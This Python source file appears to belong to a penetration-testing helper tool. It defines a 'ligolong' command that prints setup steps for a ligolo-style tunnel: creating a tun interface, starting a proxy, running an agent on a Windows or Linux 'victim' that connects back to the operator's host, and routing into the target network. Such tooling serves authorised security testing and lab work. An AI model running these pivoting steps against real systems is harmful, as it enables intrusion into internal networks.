import os
import pwd

from command.Command import Command
from Util import getarg

class CommandLigolong(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        configDefaults = config['defaults']
        configLigolong = config['commands']['ligolong']
        lhost = configLigolong['lhost'] if 'lhost' in configLigolong else configDefaults['lhost']
        lport = configLigolong["serverPort"]

        self.defaultProxyEndpoint = f'{lhost}:{lport}'
        self.laddr = f'0.0.0.0:{lport}'
 

    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['ligolo', 'ligolong']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'ligolong [<ligolong-interface>] [<proxy-endpoint>]'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        proxyEnpoint = getarg(args, 1) or self.defaultProxyEndpoint
        interface = getarg(args, 0) or '<logolong-interface>'

        username = pwd.getpwuid(os.getuid())[0]

        output = []
        output.append('# prepare ligolo interface')
        output.append(f'sudo ip tuntap add user {username} mode tun <ligolo-interface>')
        output.append(f'sudo ip link set {interface} up')
        output.append('')
        output.append('# start server')
        output.append(f'ligolong-proxy -laddr {self.laddr} -selfcert')
        output.append('')
        output.append('# connect client')
        output.append('## from Windows victim')
        output.append(f'.\\ligolong-agent.exe -connect {proxyEnpoint} -ignore-cert')
        output.append('## from Linux victim (recommended to statically compile agent)')
        output.append(f'./ligolong-agent-static -connect {proxyEnpoint} -ignore-cert')
        output.append('')
        output.append('# list sessions (interactively in ligolo proxy)')
        output.append('sessions')
        output.append('')
        output.append('# select session (interactively) and start tunnel')
        output.append(f'start --tun {interface}')
        output.append('')
        output.append('# set route')
        output.append(f'sudo ip route add <target-net> dev {interface}')
        return output
